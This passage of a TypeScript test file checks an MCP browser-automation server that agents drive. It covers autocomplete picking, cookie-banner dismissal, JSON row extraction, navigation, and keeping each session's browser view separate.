      ref: "@e1",
    });

    expect(text).toContain("On top of the page (banner)");
    expect(text).toContain('@e3 "Accept all"');
  });
});

describe("picking from an autocomplete", () => {
  it("fills, chooses the matching suggestion, and confirms the field took it", async () => {
    await seedRefs("session-1", fromInput);
    respondWith((expression) => {
      if (scriptIs.snapshot(expression)) return withSuggestion;
      if (scriptIs.settle(expression)) return 60;
      if (scriptIs.center(expression)) return { x: 1, y: 1 };
      if (scriptIs.fill(expression)) return { status: "ok" };
      if (scriptIs.click(expression))
        return {
          status: "ok",
          tag: "option",
          text: "New Delhi (DEL)",
          x: 1,
          y: 1,
        };
      if (scriptIs.value(expression)) return "New Delhi (DEL)";
      if (scriptIs.keyProbe(expression)) return true;
      return null;
    });

    const { text, isError } = await call("browser_interact", {
      action: "pick",
      ref: "@e1",
      text: "Delhi",
    });

    expect(isError).toBe(false);
    expect(text).toContain('Picked "New Delhi (DEL)"');
    expect(text).toContain('reads "New Delhi (DEL)"');
    expect(evaluated.join("\n")).toContain("#opt-del");
    expect(evaluated.join("\n")).not.toContain("#opt-dsm");
  });

  it("reports a field that kept its old value instead of calling the pick a success", async () => {
    await seedRefs("session-1", fromInput);
    respondWith((expression) => {
      if (scriptIs.snapshot(expression)) return withSuggestion;
      if (scriptIs.settle(expression)) return 60;
      if (scriptIs.center(expression)) return { x: 1, y: 1 };
      if (scriptIs.fill(expression)) return { status: "ok" };
      if (scriptIs.click(expression))
        return { status: "ok", tag: "option", text: "", x: 1, y: 1 };
      if (scriptIs.value(expression)) return "";
      if (scriptIs.keyProbe(expression)) return true;
      return null;
    });

    const { text, isError } = await call("browser_interact", {
      action: "pick",
      ref: "@e1",
      text: "Delhi",
    });

    expect(isError).toBe(true);
    expect(text).toContain("did not accept");
    expect(text).toContain('@e7 "New Delhi (DEL)"');
  });

  it("needs text and a ref", async () => {
    await seedRefs("session-1", fromInput);

    expect(
      (await call("browser_interact", { action: "pick", ref: "@e1" })).isError
    ).toBe(true);
    expect(
      (await call("browser_interact", { action: "pick", text: "Delhi" }))
        .isError
    ).toBe(true);
  });
});

describe("dismissing what is on top of the page", () => {
  it("clicks the banner's accept button and says so", async () => {
    await seedRefs();
    respondWith((expression) => {
      if (scriptIs.snapshot(expression)) return cookieBanner;
      if (scriptIs.settle(expression)) return 50;
      if (scriptIs.click(expression))
        return { status: "ok", tag: "button", text: "Accept all", x: 1, y: 1 };
      if (scriptIs.keyProbe(expression)) return true;
      return null;
    });

    const { text, isError } = await call("browser_interact", {
      action: "dismiss",
    });

    expect(isError).toBe(false);
    expect(text).toContain('Dismissed "Accept all"');
    expect(evaluated.join("\n")).toContain("#accept");
  });

  it("says when there is nothing to dismiss", async () => {
    respondWith((expression) =>
      scriptIs.snapshot(expression) ? oneButton : null
    );

    const { text, isError } = await call("browser_interact", {
      action: "dismiss",
    });

    expect(isError).toBe(true);
    expect(text).toContain("No dialog, banner or overlay");
  });
});

describe("reading the page without a tree", () => {
  it("extracts rows as JSON", async () => {
    respondWith((expression) =>
      scriptIs.extract(expression)
        ? {
            status: "ok",
            total: 30,
            rows: [
              {
                text: "USB-C cable",
                price: "₹299",
                href: "https://a.test/p/1",
              },
            ],
          }
        : null
    );

    const { text, isError } = await call("browser_snapshot", {
      action: "extract",
      selector: "li",
      fields: { price: ".price" },
      limit: 1,
    });

    expect(isError).toBe(false);
    expect(text).toContain('1 of 30 rows matching "li"');
    expect(text).toContain('"price": "₹299"');
    expect(evaluated.join("\n")).toContain('"price":".price"');
  });

  it("refuses extract without a selector, and reports a selector that matches nothing", async () => {
    expect(
      (await call("browser_snapshot", { action: "extract" })).isError
    ).toBe(true);

    respondWith((expression) =>
      scriptIs.extract(expression) ? { status: "not_found" } : null
    );
    const { text, isError } = await call("browser_snapshot", {
      action: "extract",
      selector: ".nope",
    });

    expect(isError).toBe(true);
    expect(text).toContain("Nothing matches");
  });

  it("lists only the elements matching find", async () => {
    respondWith(() => withSuggestion);

    const { text } = await call("browser_snapshot", {
      action: "snapshot",
      find: "delhi",
    });

    expect(text).toContain('1 element matching "delhi"');
    expect(text).toContain("@e7");
    expect(text).not.toContain("@e2");
  });
});

describe("arriving on a page", () => {
  it("lists the page's clickable elements and a tip for a known site", async () => {
    respondWith((expression) => {
      if (scriptIs.snapshot(expression))
        return {
          ...fromInput,
          url: "https://www.google.com/travel/flights",
          title: "Flights",
        };
      if (scriptIs.settle(expression)) return 40;
      return null;
    });

    const { text, isError } = await call("browser_navigate", {
      action: "goto",
      url: "https://www.google.com/travel/flights",
    });

    expect(isError).toBe(false);
    expect(text).toContain(
      "Navigated to https://www.google.com/travel/flights"
    );
    expect(text).toContain("2 interactive elements");
    expect(text).toContain('@e1 [input] "From"');
    expect(text).toContain("Tip for this site");
  });
});

describe("whose browser a call drives", () => {
  it("never drives another session's view, even when it is the only one", async () => {
    page.sessionId = "someone-else";
    materializeEnabled = false;

    const { text, isError } = await call(
      "browser_snapshot",
      { action: "snapshot" },
      "mine"
    );

    expect(isError).toBe(true);
    expect(text).toContain("web_fetch");
  });

  it("gets a view of its own created when it has none", async () => {
    page.sessionId = "someone-else";
    respondWith(() => oneButton);

    const { isError } = await call(
      "browser_snapshot",
      { action: "snapshot" },
      "mine"
    );

    expect(isError).toBe(false);
    expect(rendererEvents).not.toContainEqual(
      expect.objectContaining({ type: "mcp-open-preview" })
    );
  });
});

describe("which pane a browser event is for", () => {
  it("stamps the caller's conversation on the preview event", async () => {
    const { McpBrowserServer } = await import("./mcp-browser-server");
    const { sessionConversationKey } =
      await import("#shared/conversation-scope");
    const key = sessionConversationKey("workspace-1", "keyed");
    const other = new McpBrowserServer({
      target: () => fakeTarget,
      timeouts: { attachMs: 50, navigateMs: 600, historyMs: 600 },
      conversationKeyForSession: (sessionId) =>
        sessionId === "keyed" ? key : null,
    });
    const otherPort = await other.start();
    page.sessionId = "keyed";

    await fetch(`http://127.0.0.1:${otherPort}/mcp?session=keyed`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: {
          name: "browser_navigate",
          arguments: { action: "goto", url: "https://example.test/keyed" },
        },
      }),
    });

    expect(rendererEvents).toContainEqual(
      expect.objectContaining({
        type: "mcp-open-preview",
        url: "https://example.test/keyed",
        conversationKey: key,
      })
    );
    other.stop();
  });
});
